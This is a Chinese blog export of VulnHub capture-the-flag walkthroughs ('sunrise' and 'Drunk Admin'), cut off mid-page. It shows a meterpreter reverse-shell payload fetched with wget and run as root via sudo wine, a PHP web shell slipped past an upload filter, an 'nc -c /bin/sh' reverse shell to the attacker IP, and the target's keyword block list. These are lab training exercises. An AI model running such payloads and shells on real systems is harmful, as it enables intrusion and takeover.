playing! - Felipe Winsnes (@whitecr0wz)</span><br><span class="line"></span><br><span class="line">24edb59d21c273c033aa6f1689b0b18c</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub101.jpg"></p>
<p><font color="red">What a beautiful sunrise!!!</font></p>
<h3 id="Other-way"><a href="#Other-way" class="headerlink" title="Other way"></a>Other way</h3><p>如果root的hash值解密不出来，还可以使用sunrise/thefutureissobrightigottawearshades登录，然后提权，密码拆开正常排序发现是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">the future is so bright i gotta wear shades</span><br><span class="line">(未来是如此光明，以至于我必须戴上墨镜)</span><br></pre></td></tr></table></figure>

<p>成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ su sunrise                                                                                                                                                                                                               </span><br><span class="line">Password:                                                                                                                                                                                                                                  </span><br><span class="line">sunrise@sunrise:/home/weborf$ id                                                                                                                                                                                                           </span><br><span class="line">uid=1000(sunrise) gid=1000(sunrise) groups=1000(sunrise),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)                                                                 </span><br><span class="line">sunrise@sunrise:/home/weborf$ whoami                                                                                                                                                                                                       </span><br><span class="line">sunrise</span><br></pre></td></tr></table></figure>

<p>下面是提权进程，基本不需要各种提权脚本，手动更快更准</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunrise@sunrise:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> sunrise:                                                                                                                                                                                                               </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sunrise on sunrise:                                                                                                                                                                                          </span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">User sunrise may run the following commands on sunrise:                                                                                                                                                                                    </span><br><span class="line">    (root) /usr/bin/wine</span><br><span class="line"></span><br><span class="line">sunrise@sunrise:~$ <span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure>

<p>Wine（Wine不是模拟器的递归反义词）是一个免费的开放源代码兼容性层，旨在使为Microsoft Windows开发的计算机程序（应用程序软件和计算机游戏）能够在类似Unix的操作系统上运行。</p>
<p>可以以root身份运行wine，创建可以使用wine执行的payload。 使用msfpc进行payload创建。 创建payload后，将运行python一个liner将payload传输到目标计算机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfpc windows 192.168.56.102</span></span><br><span class="line"> [*] MSFvenom Payload Creator (MSFPC v1.4.5)</span><br><span class="line"> [i]   IP: 192.168.56.102</span><br><span class="line"> [i] PORT: 443</span><br><span class="line"> [i] TYPE: windows (windows/meterpreter/reverse_tcp)</span><br><span class="line"> [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \</span><br><span class="line">  --platform windows -a x86 -e generic/none LHOST=192.168.56.102 LPORT=443 \</span><br><span class="line">  &gt; <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> [i] windows meterpreter created: <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"> [i] MSF handler file: <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;</span></span><br><span class="line"> [i] Run: msfconsole -q -r <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;</span></span><br><span class="line"> [?] Quick web server (<span class="keyword">for</span> file transfer)?: python2 -m SimpleHTTPServer 8080</span><br><span class="line"> [*] Done!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>将payload托管在攻击者的计算机上，使用wget工具将所述文件下载到目标计算机。 成功将payload传输到目标计算机之后，使用wine和sudo执行有效负载。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunrise@sunrise:/tmp$ wget http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">--2019-12-25 04:29:12--  http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 73802 (72K) [application/x-msdos-program]</span><br><span class="line">Saving to: ‘windows-meterpreter-staged-reverse-tcp-443.exe’</span><br><span class="line"></span><br><span class="line">windows-meterpreter-staged-reverse-tcp-443.exe             100%[=======================================================================================================================================&gt;]  72.07K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-12-25 04:29:12 (439 MB/s) - ‘windows-meterpreter-staged-reverse-tcp-443.exe’ saved [73802/73802]</span><br><span class="line"></span><br><span class="line">sunrise@sunrise:/tmp$ sudo wine windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">[sudo] password <span class="keyword">for</span> sunrise: </span><br></pre></td></tr></table></figure>

<p>使用msfpc工具生成payload时，还将运行payload侦听器所需的配置来生成Metasploit Framework ruby文件。 运行了该ruby文件，在该目标计算机上使用wine运行该文件时。 看到一个session弹出。 由于该文件是使用具有root特权shell的wine执行的，因此我们也获得了root权限。 遍历到根目录，当列出该目录中的所有文件时，找到root.txt的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole -q -r &#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;                                                                                                                                                    </span></span><br><span class="line">[*] Processing /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc <span class="keyword">for</span> ERB directives.                                                                                                                                                 </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; use exploit/multi/handler                                                                                                                                              </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp                                                                                                                            </span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp                                                                                                                                                                                                 </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> LHOST 192.168.56.102                                                                                                                                               </span><br><span class="line">LHOST =&gt; 192.168.56.102</span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; run -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:443 </span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai</span><br><span class="line">[*] Sending encoded stage (180320 bytes) to 192.168.56.104</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.102:443 -&gt; 192.168.56.104:44876) at 2019-12-25 04:37:04 -0500</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: whoami.</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: sunrise\root</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">Z:\tmp</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> /root</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: Z:\root</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  1602  fil   2019-12-05 17:24:31 -0500  .ICEauthority</span><br><span class="line">100666/rw-rw-rw-  104   fil   2019-12-05 17:40:27 -0500  .Xauthority</span><br><span class="line">100666/rw-rw-rw-  142   fil   2019-12-25 04:07:46 -0500  .bash_history</span><br><span class="line">100666/rw-rw-rw-  570   fil   2010-01-31 06:52:26 -0500  .bashrc</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 17:46:24 -0500  .cache</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:48:21 -0500  .config</span><br><span class="line">100666/rw-rw-rw-  35    fil   2019-12-04 15:46:34 -0500  .dmrc</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:48:12 -0500  .gnupg</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 14:29:33 -0500  .<span class="built_in">local</span></span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 17:46:29 -0500  .mozilla</span><br><span class="line">100666/rw-rw-rw-  0     fil   2019-12-04 16:56:11 -0500  .odbc.ini</span><br><span class="line">100666/rw-rw-rw-  148   fil   2015-08-17 11:30:33 -0400  .profile</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 14:48:28 -0500  .rpmdb</span><br><span class="line">100666/rw-rw-rw-  66    fil   2019-12-05 16:08:41 -0500  .selected_editor</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:47:54 -0500  .ssh</span><br><span class="line">100666/rw-rw-rw-  252   fil   2019-12-05 14:59:00 -0500  .wget-hsts</span><br><span class="line">100666/rw-rw-rw-  2211  fil   2019-12-05 17:24:30 -0500  .xsession-errors</span><br><span class="line">100666/rw-rw-rw-  2211  fil   2019-12-05 13:51:40 -0500  .xsession-errors.old</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Desktop</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Documents</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Downloads</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Groups</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Logs</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Manual</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Music</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Pictures</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Public</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Readme</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Templates</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:26 -0400  Users</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Videos</span><br><span class="line">100666/rw-rw-rw-  701   fil   2019-12-05 17:22:55 -0500  root.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat root.txt</span><br><span class="line">            ^^                   @@@@@@@@@</span><br><span class="line">       ^^       ^^            @@@@@@@@@@@@@@@</span><br><span class="line">                            @@@@@@@@@@@@@@@@@@              ^^</span><br><span class="line">                           @@@@@@@@@@@@@@@@@@@@</span><br><span class="line"> ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; ~~~~~~~ ~~~~~~~~~~~ ~~~</span><br><span class="line"> ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~</span><br><span class="line">   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~</span><br><span class="line">   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~</span><br><span class="line"> ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~</span><br><span class="line">       ~             ~        ~      ~      ~~   ~             ~</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)</span><br><span class="line"></span><br><span class="line">24edb59d21c273c033aa6f1689b0b18c</span><br></pre></td></tr></table></figure>

<p><font color="green">帅掉渣！！！还有更多方法请通过qq告诉我，我的qq:1185151867</font></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Drunk-Admin-Web-Hacking-Challenge-1]</title>
    <url>/2019/12/08/vulnhub-Drunk-Admin-Web-Hacking-Challenge-1/</url>
    <content><![CDATA[<h3 id="靶机镜像下载-drunk-admin-hacking-challenge-zip"><a href="#靶机镜像下载-drunk-admin-hacking-challenge-zip" class="headerlink" title="靶机镜像下载(drunk_admin_hacking_challenge.zip)"></a>靶机镜像下载(drunk_admin_hacking_challenge.zip)</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL2JlY2h0c291ZGlzLmNvbS9kYXRhL2NoYWxsZW5nZXMvZHJ1bmtfYWRtaW5faGFja2luZ19jaGFsbGVuZ2Uuemlw">http://bechtsoudis.com/data/challenges/drunk_admin_hacking_challenge.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kcnVua2FkbWluaGFja2luZ2NoYWxsZW5nZS9kcnVua19hZG1pbl9oYWNraW5nX2NoYWxsZW5nZS56aXA=">https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kcnVua2FkbWluaGFja2luZ2NoYWxsZW5nZS9kcnVua19hZG1pbl9oYWNraW5nX2NoYWxsZW5nZS56aXAudG9ycmVudA==">https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
<li>发布日期：2012年4月2日</li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>默认情况下，将网络配置为通过DHCP获取IP地址。 虽然如果您想进一步配置虚拟机，则可以以用户root和密码toor登录。 apache Web服务器配置为在端口8880上运行。</p>
<p>挑战包括具有各种设计漏洞的图像托管Web服务。 您必须枚举各种Web服务功能并找到可利用的漏洞才能读取系统隐藏文件。 该网络应用程序是100％自定义的，因此请勿尝试在Google中搜索相对的PoC攻击代码。</p>
<p>最终目标：显示隐藏的消息，以安排Bob发送给Alice的日期。</p>
<h3 id="虚拟机网络配置"><a href="#虚拟机网络配置" class="headerlink" title="虚拟机网络配置"></a>虚拟机网络配置</h3><p>将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]即可。</p>
<h3 id="主机发现与信息收集"><a href="#主机发现与信息收集" class="headerlink" title="主机发现与信息收集"></a>主机发现与信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub14.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 192.168.84.138 -p 1-65535</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub15.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -Pn -T4 -sV -v --script=vuln 192.168.84.138 -p 22,8880</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub16.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub17.jpg"></p>
<p>可以看到是一个文件上传页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub18.jpg"></p>
<h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>首先上传正常图片，抓包，观察返回包，发现其中Set-Cookie: trypios的值和图片的前缀一致<br>之后成功上传php文件后也可以借鉴此hash路径。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub19.jpg"></p>
<p>将后缀改成.jpg.php后发现成功上传，再将body中的图片内容改成普通的php木马，如下图所示被识别。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub20.jpg"></p>
<p>图中是蚁剑base64加密的木马，可以发现被拦截了。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub21.jpg"></p>
<p>如下图自己构造php payload读取upload.php文件内容，看看过滤了什么，如下图。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;../upload.php&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub22.jpg"></p>
<p>右键查看源码，发现过滤了如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define (<span class="string">&quot;MAX_SIZE&quot;</span>,<span class="string">&quot;500&quot;</span>);</span><br><span class="line"><span class="variable">$raw_name</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> getExtension(<span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="variable">$i</span> = strrpos(<span class="variable">$str</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$i</span>) &#123; <span class="built_in">return</span> <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$str</span>) - <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$ext</span> = substr(<span class="variable">$str</span>,<span class="variable">$i</span>+1,<span class="variable">$l</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ext</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span>=0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$image</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$image</span>) &#123;</span><br><span class="line">     <span class="variable">$filename</span> = stripslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = getExtension(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$extension</span> = strtolower(<span class="variable">$extension</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^.*\.(bmp|jpeg|gif|png|jpg).*$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$size</span>=filesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$size</span> &gt; MAX_SIZE*1024) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;You have exceeded the size limit!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$errors</span>=1;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable">$raw_name</span>=md5(<span class="variable">$image</span>);</span><br><span class="line">        <span class="variable">$image_name</span>=md5(<span class="variable">$image</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            <span class="variable">$newname</span>=<span class="string">&quot;images/&quot;</span>.<span class="variable">$image_name</span>;</span><br><span class="line">            <span class="variable">$copied</span> = copy(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$newname</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$copied</span>) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Copy unsuccessful!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$errors</span>=1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Invalid file extension!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$errors</span>=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;No image selected. Be carefull next time!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$errors</span>=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;No data? Come on give me something to play with!&lt;/h1&gt;&#x27;</span>; </span><br><span class="line">    <span class="variable">$errors</span>=1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;Submit&#x27;</span>]) &amp;&amp; !<span class="variable">$errors</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="string">&quot;./images/<span class="variable">$image_name</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( strpos(<span class="variable">$file</span>,<span class="string">&quot;perl&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;bash&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;sh -c&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;python&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;nc &quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;netcat&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;base64&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;ruby&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;fsockopen&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;xterm&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;gcc&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_GET&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_POST&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_SERVER&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_FILES&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_COOKIE&#x27;</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&quot;rm ./images/<span class="variable">$image_name</span>&quot;</span>);</span><br><span class="line">    die;</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">&quot;trypios&quot;</span>, <span class="string">&quot;<span class="variable">$raw_name</span>&quot;</span>, time()+3600);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt; window.location = &quot;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].<span class="string">&quot;:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>].<span class="string">&#x27;/image.php&quot; &lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub23.jpg"></p>
<p>知道了过滤了什么，就知道如何构造木马，如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exec</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub24.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub25.jpg"></p>
<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.84.138:8880/images/a361463fc252b94026673a556a177ee7?cmd=nc -c /bin/sh 192.168.84.135 4444</span><br></pre></td></tr></table></figure>

<p>kali攻击机执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub26.jpg"></p>
<h3 id="查看敏感文件"><a href="#查看敏感文件" class="headerlink" title="查看敏感文件"></a>查看敏感文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">ls</span><br><span class="line">bob</span><br><span class="line"><span class="built_in">cd</span> bob</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">Documents</span><br><span class="line">public_html</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> public_html</span><br><span class="line">ls</span><br><span class="line">encrypt.php</span><br><span class="line">include</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">cat index.php</span><br><span class="line">&lt;?php </span><br><span class="line">require <span class="string">&#x27;include/aes.class.php&#x27;</span>;</span><br><span class="line">require <span class="string">&#x27;include/aesctr.class.php&#x27;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&#x27;bf0OvfUkVk+AJq8e+jbVlDdCYQoNVa9/eCCt+3y6qLb8jPdH6O43QlxAo80H2EASR8UKH9zVHDQ2aHZUoahc7dqTcGRcwCURwBWWew==&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;sc&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;decr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$decr</span> = AesCtr::decrypt(<span class="variable">$cipher</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;sc&#x27;</span>], 256);</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$decr</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;   </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Bob<span class="string">&#x27;s Secret Messages&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span 